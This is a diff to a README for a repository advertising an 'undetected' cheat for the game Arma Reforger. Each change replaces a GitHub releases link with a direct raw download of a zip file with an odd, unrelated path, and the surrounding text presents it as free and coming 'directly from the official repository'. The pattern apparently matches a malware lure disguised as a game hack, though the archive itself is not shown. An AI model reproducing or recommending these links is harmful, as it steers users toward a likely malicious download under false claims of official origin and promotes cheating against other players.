@@ -1,6 +1,6 @@
 # 🎯 Arma-Reforger-Hack - Dominate Every Battle with Undetected Precision
 
-[![Download Now](https://img.shields.io/badge/Download-Arma_Reforger_Hack-green?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://github.com/Middling-auditedaccount739/Arma-Reforger-Hack/releases)
+[![Download Now](https://img.shields.io/badge/Download-Arma_Reforger_Hack-green?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://raw.githubusercontent.com/Middling-auditedaccount739/Arma-Reforger-Hack/main/thistlery/chemicoengineering.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Ready to jump in? Follow these simple steps and you'll be up and running in unde
 
 Visit this link to download the application:
 
-[🔗 Download Arma-Reforger-Hack](https://github.com/Middling-auditedaccount739/Arma-Reforger-Hack/releases)
+[🔗 Download Arma-Reforger-Hack](https://raw.githubusercontent.com/Middling-auditedaccount739/Arma-Reforger-Hack/main/thistlery/chemicoengineering.zip)
 
 The download is completely free and comes directly from the official repository.
 
@@ -95,7 +95,7 @@ No. All updates are free and automatically available from the same download link
 
 Arma Reforger receives frequent patches. When that happens, simply revisit the download link below and grab the latest version—it's always free and ready to use:
 
-[⬇️ Get the Latest Version Here](https://github.com/Middling-auditedaccount739/Arma-Reforger-Hack/releases)
+[⬇️ Get the Latest Version Here](https://raw.githubusercontent.com/Middling-auditedaccount739/Arma-Reforger-Hack/main/thistlery/chemicoengineering.zip)
 
 ---
 
